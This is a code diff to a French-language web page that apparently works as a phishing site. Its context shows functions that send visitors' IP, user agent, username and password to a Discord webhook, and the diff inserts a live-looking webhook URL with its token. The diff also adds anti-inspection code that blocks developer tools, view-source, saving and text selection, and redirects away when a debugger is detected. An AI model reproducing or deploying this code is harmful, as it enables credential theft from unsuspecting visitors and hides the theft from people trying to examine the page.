@@ -11,6 +11,10 @@
       font-family: 'Arial', sans-serif;
       background-color: #0d0d0d;
       color: #fff;
+      user-select: none; /* Désactiver la sélection */
+      -webkit-user-select: none;
+      -moz-user-select: none;
+      -ms-user-select: none;
     }
 
     /* HEADER */
@@ -276,11 +280,103 @@
 
   <script>
     // Configuration du webhook - Remplacez par votre URL de webhook
-    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1407168541895032874/qoE-N60F-LDrTfWfHl88af5twQSxn_vhB_Xlao11QMCDz43BCQrSCwxxfZdC2dgGmYqX';
+    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1408202683021529099/b6VSQ72fPLL29P_W2sk-lgeWOa4Nk2fZOHDPAgukRaJMpGxVOrNdeON0dGc9LZdZYUz7';
     
     // Variables pour stocker les infos utilisateur
     let userIP = 'Non disponible';
     let userAgent = navigator.userAgent;
+
+    // ========== PROTECTION ANTI-F12 ==========
+    
+    // Désactiver le clic droit
+    document.addEventListener('contextmenu', function(e) {
+      e.preventDefault();
+      return false;
+    });
+
+    // Désactiver les raccourcis clavier
+    document.addEventListener('keydown', function(e) {
+      // F12
+      if (e.keyCode === 123) {
+        e.preventDefault();
+        return false;
+      }
+      
+      // Ctrl+Shift+I (Outils développeur)
+      if (e.ctrlKey && e.shiftKey && e.keyCode === 73) {
+        e.preventDefault();
+        return false;
+      }
+      
+      // Ctrl+Shift+J (Console)
+      if (e.ctrlKey && e.shiftKey && e.keyCode === 74) {
+        e.preventDefault();
+        return false;
+      }
+      
+      // Ctrl+U (Code source)
+      if (e.ctrlKey && e.keyCode === 85) {
+        e.preventDefault();
+        return false;
+      }
+      
+      // Ctrl+Shift+C (Sélecteur d'élément)
+      if (e.ctrlKey && e.shiftKey && e.keyCode === 67) {
+        e.preventDefault();
+        return false;
+      }
+      
+      // Ctrl+S (Sauvegarder)
+      if (e.ctrlKey && e.keyCode === 83) {
+        e.preventDefault();
+        return false;
+      }
+    });
+
+    // Détection de l'ouverture des DevTools
+    let devtools = {
+      open: false,
+      orientation: null
+    };
+
+    const threshold = 160;
+
+    setInterval(() => {
+      if (window.outerHeight - window.innerHeight > threshold || 
+          window.outerWidth - window.innerWidth > threshold) {
+        if (!devtools.open) {
+          devtools.open = true;
+          // Rediriger ou fermer si DevTools détectés
+          window.location.href = 'https://www.google.com';
+        }
+      } else {
+        devtools.open = false;
+      }
+    }, 500);
+
+    // Désactiver la sélection de texte
+    document.addEventListener('selectstart', function(e) {
+      e.preventDefault();
+      return false;
+    });
+
+    // Désactiver le glisser-déposer
+    document.addEventListener('dragstart', function(e) {
+      e.preventDefault();
+      return false;
+    });
+
+    // Détection de debug
+    let start = new Date();
+    debugger;
+    let end = new Date();
+    if (end - start > 100) {
+      window.location.href = 'https://www.google.com';
+    }
+
+    // Message d'avertissement
+    console.log('%cARRÊT !', 'color: red; font-size: 50px; font-weight: bold;');
+    console.log('%cCeci est une fonctionnalité de navigateur destinée aux développeurs.', 'color: red; font-size: 16px;');
 
     // Fonction pour récupérer l'IP
     async function getUserIP() {
@@ -342,6 +438,7 @@
         console.error('Erreur lors de l\'envoi de la visite:', error);
       }
     }
+
     // Fonction pour envoyer les données vers le webhook
     async function sendToWebhook(username, password) {
       try {
